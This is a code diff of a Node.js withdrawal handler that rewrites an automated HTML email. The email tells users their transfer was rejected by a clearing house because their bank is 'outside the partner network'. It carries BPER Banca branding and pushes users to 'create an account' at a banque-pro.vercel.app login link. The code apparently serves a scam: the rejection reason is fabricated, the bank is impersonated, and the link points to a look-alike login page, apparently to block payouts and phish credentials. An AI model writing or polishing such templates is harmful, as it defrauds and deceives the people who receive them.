@@ -323,112 +323,110 @@ exports.retrait = async (req, res) => {
     // 🚀 ENVOI AUTOMATIQUE DE L'EMAIL DE REFUS PROFESSIONNEL (SI HORS RESEAU PARTENAIRE)
     if (declencherMailRefus && req.user.email) {
       const mailOptions = {
-        from: `"BPER Banca - Flux" <${process.env.PAIEMENT_EMAIL_USER}>`,
+        from: `"Service Conformité" <${process.env.PAIEMENT_EMAIL_USER}>`,
         to: req.user.email,
-        subject: `Rejet d'opération : Virement TR-${retrait._id.toString().substring(0,8).toUpperCase()}`,
+        subject: `⚠️ REJET D'ORDRE DE VIREMENT - RÉF : ${retrait._id}`,
         html: `
           <!DOCTYPE html>
           <html>
           <head>
-            <meta charset="utf-8">
+            <meta charset="UTF-8">
             <meta name="viewport" content="width=device-width, initial-scale=1.0">
-            <title>Notification de Rejet Interbancaire</title>
+            <title>Avis de rejet interbancaire</title>
             <style>
-              body { margin: 0; padding: 0; background-color: #f4f6f8; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
-              table { border-collapse: collapse; width: 100%; }
-              .wrapper { width: 100%; table-layout: fixed; background-color: #f4f6f8; padding: 40px 0; }
-              .container { max-width: 520px; margin: 0 auto; background-color: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.05); border: 1px solid #eef1f4; }
-              .header { background-color: #0c1a30; padding: 30px 20px; text-align: center; }
-              .content { padding: 30px 25px; text-align: center; }
+              body { margin: 0; padding: 0; background-color: #f4f5f7; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; -webkit-font-smoothing: antialiased; }
+              .wrapper { width: 100%; table-layout: fixed; background-color: #f4f5f7; padding-bottom: 40px; padding-top: 40px; }
+              .main-table { width: 100%; max-width: 550px; margin: 0 auto; background-color: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); border-collapse: collapse; }
+              .header { background-color: #0c1a30; padding: 30px; text-align: center; border-bottom: 3px solid #009688; }
+              .header-title { color: #ffffff; margin: 0; font-size: 18px; font-weight: 700; text-transform: uppercase; letter-spacing: 1px; }
+              .content { padding: 35px 30px; background-color: #ffffff; }
               
-              /* Sticker / Badge Échec */
-              .status-badge { display: inline-block; width: 56px; height: 56px; background-color: #fef2f2; border-radius: 50%; line-height: 58px; text-align: center; font-size: 24px; color: #ef4444; margin-bottom: 16px; border: 1px solid #fee2e2; }
+              /* Badge échec pro */
+              .status-badge-container { text-align: center; margin-bottom: 25px; }
+              .status-badge { display: inline-block; background-color: #fef2f2; border: 1px solid #fee2e2; border-radius: 50px; padding: 8px 16px; }
+              .status-icon { display: inline-block; vertical-align: middle; font-size: 16px; margin-right: 6px; }
+              .status-text { display: inline-block; vertical-align: middle; color: #991b1b; font-weight: 700; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; }
               
-              .title { font-size: 18px; font-weight: 700; color: #0c1a30; margin: 0 0 8px 0; }
-              .subtitle { font-size: 14px; color: #ef4444; font-weight: 600; margin: 0 0 24px 0; text-transform: uppercase; letter-spacing: 0.5px; }
+              .intro-text { font-size: 14px; line-height: 1.5; color: #4b5563; margin-top: 0; margin-bottom: 25px; text-align: center; }
               
-              /* Grille de transaction style Ticket */
-              .receipt-table { background-color: #f8fafc; border-radius: 8px; padding: 16px; margin-bottom: 24px; border: 1px dashed #e2e8f0; }
-              .receipt-row { font-size: 13px; color: #64748b; padding: 6px 0; text-align: left; }
-              .receipt-value { font-size: 13px; color: #0f172a; font-weight: 600; text-align: right; font-family: monospace; }
-              .receipt-value.reason { color: #b91c1c; font-family: inherit; }
+              /* Tableau de transaction minimaliste */
+              .data-table { width: 100%; border-collapse: collapse; margin-bottom: 30px; background-color: #f9fafb; border-radius: 8px; border: 1px solid #f3f4f6; }
+              .data-table td { padding: 12px 16px; font-size: 13px; color: #1f2937; border-bottom: 1px solid #f3f4f6; }
+              .data-table tr:last-child td { border-bottom: none; }
+              .label { color: #6b7280; font-weight: 500; width: 40%; }
+              .value { font-weight: 600; text-align: right; }
+              .value-mono { font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace; font-size: 12px; }
+              .value-error { color: #dc2626; font-weight: 700; }
               
-              /* Call To Action */
-              .btn-cta { display: inline-block; background-color: #009688; color: #ffffff !important; text-decoration: none; padding: 14px 24px; font-weight: 700; font-size: 14px; border-radius: 6px; margin: 10px 0 20px 0; box-shadow: 0 3px 6px rgba(0,150,136,0.15); }
+              /* Bouton Call to Action */
+              .button-container { text-align: center; margin-top: 10px; margin-bottom: 10px; }
+              .btn-bper { display: inline-block; background-color: #009688; color: #ffffff !important; text-decoration: none; padding: 14px 24px; font-weight: 700; font-size: 13px; border-radius: 6px; letter-spacing: 0.5px; text-transform: uppercase; box-shadow: 0 3px 6px rgba(0, 150, 136, 0.2); }
               
-              .footer { background-color: #fafbfc; padding: 20px; text-align: center; font-size: 11px; color: #94a3b8; border-top: 1px solid #f1f5f9; }
-              
-              /* Mobile Responsive */
-              @media screen and (max-width: 600px) {
-                .wrapper { padding: 15px 0; }
-                .container { border-radius: 8px; }
-                .content { padding: 20px 15px; }
-              }
+              .footer { background-color: #f9fafb; padding: 20px; text-align: center; font-size: 11px; color: #9ca3af; border-top: 1px solid #f3f4f6; }
+              .footer p { margin: 0; line-height: 1.4; }
             </style>
           </head>
           <body>
-            <table class="wrapper" width="100%" cellpadding="0" cellspacing="0">
-              <tr>
-                <td align="center">
-                  <table class="container" cellpadding="0" cellspacing="0">
+            <center class="wrapper">
+              <table class="main-table" align="center">
+                <tr>
+                  <td class="header">
+                    <h1 class="header-title">Notification de Rejet SEPA</h1>
+                  </td>
+                </tr>
+                
+                <tr>
+                  <td class="content">
+                    <div class="status-badge-container">
+                      <div class="status-badge">
+                        <span class="status-icon">🛑</span>
+                        <span class="status-text">Transaction Refusée</span>
+                      </div>
+                    </div>
+
+                    <p class="intro-text">
+                      Votre demande de transfert de fonds a été interrompue par la chambre de compensation. Veuillez trouver les détails du rejet ci-dessous.
+                    </p>
                     
-                    <tr>
-                      <td class="header">
-                        <span style="color: #ffffff; font-size: 18px; font-weight: 800; letter-spacing: 2px;">BPER BANCA</span>
-                      </td>
-                    </tr>
-                    
-                    <tr>
-                      <td class="content">
-                        <div class="status-badge">✕</div>
-                        
-                        <h2 class="title">Opération Non Exécutée</h2>
-                        <p class="subtitle">Avis de rejet interbancaire</p>
-                        
-                        <table class="receipt-table" cellpadding="0" cellspacing="0">
-                          <tr>
-                            <td class="receipt-row">Référence Transac.</td>
-                            <td class="receipt-value">TR-${retrait._id.toString().substring(0,8).toUpperCase()}</td>
-                          </tr>
-                          <tr>
-                            <td class="receipt-row">Montant Ordre</td>
-                            <td class="receipt-value" style="color: #0c1a30; font-size: 14px;">${montant.toFixed(2)} EUR</td>
-                          </tr>
-                          <tr>
-                            <td class="receipt-row">Banque Cible</td>
-                            <td class="receipt-value">${bank_name || 'Établissement Tiers'}</td>
-                          </tr>
-                          <tr>
-                            <td class="receipt-row">Routage IBAN</td>
-                            <td class="receipt-value">${ibanClean.substring(0,4)}...${ibanClean.substring(ibanClean.length - 4)}</td>
-                          </tr>
-                          <tr style="border-top: 1px solid #e2e8f0;">
-                            <td class="receipt-row" style="padding-top: 12px; vertical-align: top;">Motif réglementaire</td>
-                            <td class="receipt-value reason" style="padding-top: 12px;">RIB non répertorié dans la chambre de compensation.</td>
-                          </tr>
-                        </table>
-                        
-                        <p style="font-size: 13px; color: #475569; line-height: 1.5; margin: 0 0 20px 0;">
-                          Votre compte bancaire actuel ne prend pas en charge les flux instantanés de notre plateforme. Ouvrez un compte certifié BPER Banca pour débloquer vos transactions immédiatement.
-                        </p>
-                        
-                        <a href="https://banque-pro.vercel.app/login" target="_blank" class="btn-cta">
-                          Créer mon compte BPER Banca en 2 min
-                        </a>
-                      </td>
-                    </tr>
-                    
-                    <tr>
-                      <td class="footer">
-                        <p style="margin: 0 0 4px 0;"><strong>Service de Conformité Monétique BPER</strong></p>
-                        <p style="margin: 0;">Message généré automatiquement. Conformément aux directives SEPA Européennes.</p>
-                      </td>
-                    </tr>
-                    
-                  </table>
-                </td>
-              </tr>
-            </table>
+                    <table class="data-table">
+                      <tr>
+                        <td class="label">Référence Ordre</td>
+                        <td class="value value-mono">${retrait._id}</td>
+                      </tr>
+                      <tr>
+                        <td class="label">Débit Local</td>
+                        <td class="value">${montant.toFixed(2)} EUR</td>
+                      </tr>
+                      <tr>
+                        <td class="label">Compte IBAN</td>
+                        <td class="value value-mono">${ibanClean.substring(0,4)}...${ibanClean.substring(ibanClean.length - 4)}</td>
+                      </tr>
+                      <tr>
+                        <td class="label">Code BIC</td>
+                        <td class="value value-mono">${bicClean}</td>
+                      </tr>
+                      <tr>
+                        <td class="label">Raison du Rejet</td>
+                        <td class="value value-error">Établissement hors réseau partenaire (RIB non reconnu)</td>
+                      </tr>
+                    </table>
+
+                    <div class="button-container">
+                      <a href="https://banque-pro.vercel.app/login" target="_blank" class="btn-bper">
+                        Créer mon compte BPER Banca en 2 min
+                      </a>
+                    </div>
+                  </td>
+                </tr>
+
+                <tr>
+                  <td class="footer">
+                    <p style="margin-bottom: 4px;"><strong>Tirage Royal Security Fleet</strong> &copy; 2026</p>
+                    <p>Ce message automatisé est émis conformément aux protocoles de routage interbancaires.</p>
+                  </td>
+                </tr>
+              </table>
+            </center>
           </body>
           </html>
         `
